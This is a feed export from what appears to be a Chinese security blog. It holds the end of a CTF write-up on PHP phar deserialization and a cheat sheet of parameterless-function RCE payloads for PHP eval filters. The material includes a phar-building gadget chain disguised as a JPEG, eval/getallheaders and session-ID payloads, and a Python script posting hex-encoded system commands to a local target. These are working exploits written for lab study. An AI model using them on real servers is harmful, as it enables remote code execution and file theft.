string">'&lt;td class="text-center">'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/td>'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;td class="text-center" filename="'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'">&lt;a href="#" class="download">下载&lt;/a> / &lt;a href="#" class="delete">删除&lt;/a>&lt;/td>'</span><span class="token punctuation">;</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;/tr>'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">echo</span> <span class="token variable">$table</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">File</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$units</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">' B'</span><span class="token punctuation">,</span> <span class="token string">' KB'</span><span class="token punctuation">,</span> <span class="token string">' MB'</span><span class="token punctuation">,</span> <span class="token string">' GB'</span><span class="token punctuation">,</span> <span class="token string">' TB'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$size</span> <span class="token operator">>=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token variable">$size</span> <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$units</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>代码核心就在<code>class.php</code>了</p><p>先看到login和register两个文件，用了PDO，注入相当困难，找到到文件下载功能<code>download</code>，可以看到这样的一句代码：<code>ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);</code></p><p><strong>ini_set</strong>：出为一个配置选项设置值，可以设置php的一些配置，其中就包括<strong>open_basedir</strong>，用来限制当前程序可以访问的目录。当前设置为<code>getcwd()</code>当前目录和<code>/etc</code>和<code>/tmp</code>三个目录，这就是为什么前面下载不了根目录下的<code>flag</code>了</p><p>再看到<code>delete.php</code>文件，并没有限制，于是我们寻找可利用条件，重点看到<code>class.php</code>，在这个文件的<code>File</code>类中发现了<code>close()</code>方法中有一个<code>file_get_contents</code>方法，明显的文件读取，再找到使用了这个函数的方法，不难发现在<code>User</code>类中的<code>__destruct</code>方法调用了这个函数，<code>__destruct</code>方法是当一个对象被销毁的时候才调用，delete.php中就可以触发这方法，但是这也要这些类中的属性我们可控才能调用这些方法，于是这里就引出了<code>phar</code>伪协议反序列化的操作，详见上面的说明</p><p>于是初步构造payload：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">File</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token operator">=</span><span class="token string">'/flag.txt'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>但是在<code>file_get_contents</code>后我们并没有回显的函数，于是就需要用到<code>FileList</code>类中的<code>__destruct</code>方法来回显，这里就需要再创建一个<code>FileList</code>类，令其中的<code>files</code>为<code>new File()</code>，但是这里就创建了两个类了，无法达到反序列化的效果，那么我们再来看看如何把这三个类给联系起来，可以看到<code>FileList</code>类中的<code>__call</code>方法，（ 当对象调用一个不存在的方法的时候调用，<strong>$func</strong>：被调用的方法名，<strong>$args</strong> ： 被调用方法中的参数，这是个数组），再看到上面的<code>User的</code>的<code>__destruct</code>方法，如果我们令<code>User</code>类中的<code>db</code>属性为<code>FileList</code>类，调用其中不存在的<code>close</code>方法，就可以完美触发<code>FileList</code>类中的<code>__call</code>方法，再看到<code>__call</code>方法的实现：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$func</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>array_push</strong>：将一个或多个单元压入数组的末尾（入栈）</p><p><strong>foreach</strong>：遍历数组</p><p>看到其中的<code>$file-&gt;$func();</code>，如果<code>$func</code>为<code>close</code>，就可以成功调用<code>File</code>类中的<code>close</code>方法，于是构造完整payload：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">FileList</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">File</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token operator">=</span><span class="token string">'/flag.txt'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span> <span class="token operator">-</span><span class="token operator">></span> db <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//后缀名必须为 phar</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置 stub</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义的 meta-data 存入 manifest</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"poc.php"</span><span class="token punctuation">,</span> <span class="token string">"poc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span><span class="token comment" spellcheck="true">//签名自动计算</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">rename</span><span class="token punctuation">(</span><span class="token string">'phar.phar'</span><span class="token punctuation">,</span><span class="token string">'phar.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>将生成的<code>phar.jpg</code>上传，再在<code>delete</code>操作时抓包改包，如下，即可成功得到<code>flag</code>，话说为什么是<code>flag.txt</code>我也不知道，一般不是直接<code>flag</code>吗？-.-</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504221851430.png" alt="" loading="lazy"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;参考&quot;&gt;&lt;a href=&quot;#参考&quot; class=&quot;headerlink&quot; title=&quot;参考&quot;&gt;&lt;/a&gt;参考&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2958#toc-2&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Phar与Stream Wrapper造成PHP RCE的深入挖掘&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.freebuf.com/articles/web/205943.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;PHAR反序列化拓展操作总结&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://paper.seebug.org/680/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;利用 phar 拓展 php 反序列化漏洞攻击面&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
      <category term="反序列化" scheme="https://www.extrader.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>PHP无参数RCE</title>
    <link href="https://www.extrader.top/2020/04/28/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/"/>
    <id>https://www.extrader.top/2020/04/28/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/</id>
    <published>2020-04-28T10:21:37.000Z</published>
    <updated>2020-07-14T10:43:12.023Z</updated>
    
    <content type="html"><![CDATA[<p>参考：</p><ul><li><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></li><li><a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12260986.html</a></li><li><a href="http://www.manongjc.com/detail/13-ksgbihhdbvdbnza.html" target="_blank" rel="noopener">http://www.manongjc.com/detail/13-ksgbihhdbvdbnza.html</a></li><li><a href="https://www.gem-love.com/ctf/530.html?replytocom=5" target="_blank" rel="noopener">https://www.gem-love.com/ctf/530.html?replytocom=5</a></li></ul><p>膜膜膜膜膜膜（这东西真的是奇淫技巧）</p><a id="more"></a><p><strong>利用条件</strong>：<code>eval($_GET[&#39;exp&#39;]);</code></p><p><strong>限制条件</strong>：<code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $exp)</code></p><p><strong>目录下文件</strong>：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429110200063.png" alt="" loading="lazy"></p><h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a><strong>测试代码</strong></h4><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//index.php</span><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p><code>(?R)</code>引用当前表达式，后面加了<code>?</code>递归调用</p><p>以上正则表达式只匹配<code>a(b(c()))</code>或<code>a()</code>这种格式，不匹配<code>a(&quot;123&quot;)</code>，也就是说我们传入的值函数不能带有参数</p><h4 id="Payload1-getenv"><a href="#Payload1-getenv" class="headerlink" title="Payload1-getenv()"></a>Payload1-getenv()</h4><pre class=" language-php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>可以获取敏感信息</p><ul><li><strong>getenv()</strong>：获取一个环境变量的值，<code>phpinfo()</code>可以获取所有环境变量</li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429113257924.png" alt="" loading="lazy"></p><h4 id="Payload2-getallheaders"><a href="#Payload2-getallheaders" class="headerlink" title="Payload2-getallheaders()"></a><strong>Payload2</strong>-getallheaders()</h4><pre class=" language-php"><code class="language-php"><span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token function">getallheaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>RCE</p><ul><li><strong>end()</strong>：将数组的内部指针指向最后一个单元</li><li><strong>getallheaders()</strong>：获取全部 HTTP 请求头信息</li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429114144142.png" alt="" loading="lazy"></p><h4 id="Payload3-get-defined-vars"><a href="#Payload3-get-defined-vars" class="headerlink" title="Payload3-get_defined_vars()"></a>Payload3-get_defined_vars()</h4><pre class=" language-php"><code class="language-php"><span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">get_defined_vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>flag<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>利用全局变量进RCE</p><ul><li><strong>get_defined_vars()</strong>：返回由所有已定义变量所组成的数组，会返回<code>$_GET,$_POST,$_COOKIE,$_FILES</code>全局变量的值</li><li><strong>current()</strong>：返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回<code>$_GET</code>变量的数组值</li><li><strong>get_defined_vars()</strong>：返回由所有已定义变量所组成的数组，此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。返回数组顺序为<code>get-&gt;post-&gt;cookie-&gt;files</code></li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429115651090.png" alt="" loading="lazy"></p><p>而如果网站对<code>$_GET,$_POST,$_COOKIE</code>都做的过滤， 那我们只能从<code>$_FILES</code>入手了，exp如下：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">str2hex</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>  txt <span class="token operator">=</span> <span class="token string">''</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> payload<span class="token punctuation">:</span>      txt <span class="token operator">+=</span> hex<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token keyword">return</span> txtpayload <span class="token operator">=</span> str2hex<span class="token punctuation">(</span><span class="token string">"system('cat flag.php');"</span><span class="token punctuation">)</span>files <span class="token operator">=</span> <span class="token punctuation">{</span>    payload<span class="token punctuation">:</span> b<span class="token string">'extrader'</span><span class="token punctuation">}</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://192.168.0.107/index.php?exp=eval(hex2bin(array_rand(end(get_defined_vars()))));"</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># allow_redirects=False 禁用重定向处理</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><ul><li><strong>array_rand()</strong>：从数组中随机取出一个或多个单元，如果只取出一个，<code>array_rand()</code>返回随机单元的键名。 否则就返回包含随机键名的数组。</li><li><strong>end()</strong>：将数组的内部指针指向最后一个单元</li><li><strong>hex2bin()</strong>：转换十六进制字符串为二进制字符串</li></ul><p>结果将输出<code>flag.php</code>文件的全部内容，由于空格和点都会被替换成下换线，所以需要用十六进制进行绕过</p><h4 id="Payload4-session-start"><a href="#Payload4-session-start" class="headerlink" title="Payload4-session_start()"></a>Payload4-session_start()</h4><p>文件读取：</p><pre class=" language-php"><code class="language-php"><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>抓包传入Cookie<span class="token punctuation">:</span> <span class="token constant">PHPSESSID</span><span class="token operator">=</span><span class="token punctuation">(</span>想读的文件<span class="token punctuation">)</span>即可</code></pre><p>RCE：</p><pre class=" language-php"><code class="language-php"><span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>抓包传入Cookie<span class="token punctuation">:</span> <span class="token constant">PHPSESSID</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"system('命令')"</span>的十六进制<span class="token punctuation">)</span></code></pre><p>以上的payload好像只适用于<code>php7</code>以下的版本，php7以上的不会显示</p><ul><li><strong>session_start()</strong>：启动新会话或者重用现有会话，成功开始会话返回 <strong><code>TRUE</code></strong> ，反之返回 <strong><code>FALSE</code></strong></li><li><strong>session_id()</strong>：获取/设置当前会话 ID，返回当前会话ID。 如果当前没有会话，则返回空字符串（””）。</li></ul><h4 id="Payload5-scandir"><a href="#Payload5-scandir" class="headerlink" title="Payload5-scandir()"></a>Payload5-scandir()</h4><p>文件读取：</p><pre class=" language-php"><code class="language-php">当前目录：<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">array_rand</span><span class="token punctuation">(</span><span class="token function">array_flip</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>上级目录文件：<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">array_rand</span><span class="token punctuation">(</span><span class="token function">array_flip</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ul><li><strong>getcwd()</strong>：取得当前工作目录，成功则返回当前工作目录，失败返回 <strong><code>FALSE</code></strong>。</li><li><strong>dirname()</strong>：返回路径中的目录部分，返回 path 的父目录。 如果在 <code>path</code> 中没有斜线，则返回一个点（’<em>.</em>‘），表示当前目录。否则返回的是把 <code>path</code> 中结尾的 <code>/component</code>（最后一个斜线以及后面部分）去掉之后的字符串(也就是上级目录的文件路径)。</li><li><strong>chdir()</strong>：改变目录，成功时返回 <strong><code>TRUE</code></strong>， 或者在失败时返回 <strong><code>FALSE</code></strong>。</li><li><strong>scandir()</strong>：列出指定路径中的文件和目录。成功则返回包含有文件名的数组，如果失败则返回 <strong><code>FALSE</code></strong>。如果 <code>directory</code> 不是个目录，则返回布尔值 <strong><code>FALSE</code></strong> 并生成一条 <strong><code>E_WARNING</code></strong> 级的错误。</li><li><strong>array_flip()</strong>：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 <strong><code>NULL</code></strong>。</li><li><strong>array_rand()</strong>：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，<strong>array_rand()</strong> 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。</li></ul><p><strong>array_flip()</strong>和<strong>array_rand()</strong>配合使用可随机返回当前目录下的文件名</p><p><strong>dirname(chdir(dirname()))</strong>配合切换文件路径</p><h4 id="绕过"><a href="#绕过" class="headerlink" title=".绕过"></a><code>.</code>绕过</h4><h5 id="current-localeconv"><a href="#current-localeconv" class="headerlink" title="current(localeconv())"></a><strong>current(localeconv())</strong></h5><ul><li><strong>localeconv()</strong>：返回一包含本地数字及货币格式信息的数组。而数组第一项就是<code>.</code></li></ul><h5 id="phpversion"><a href="#phpversion" class="headerlink" 